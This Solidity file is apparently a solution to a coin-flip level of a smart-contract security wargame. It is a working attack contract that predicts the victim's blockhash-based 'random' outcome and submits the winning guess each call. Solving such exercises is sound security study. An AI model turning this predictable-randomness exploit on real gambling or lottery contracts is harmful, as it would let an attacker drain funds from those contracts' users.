// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/ICoinFlip.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract CoinFlipAttack {
    using SafeMath for uint256;

    ICoinFlip public immutable victimCoinFlip;

    constructor(ICoinFlip victimCoinFlip_) {
        victimCoinFlip = victimCoinFlip_;
    }

    /// @notice run this function 10 times to pass this level
    function attack() external {
        uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 consecutiveWins = victimCoinFlip.consecutiveWins();

        victimCoinFlip.flip(
            uint256(blockhash(block.number.sub(1))).div(factor) == 1
                ? true
                : false
        );

        require(
            consecutiveWins + 1 == victimCoinFlip.consecutiveWins(),
            "CoinFlip: Attack failed"
        );
    }
}
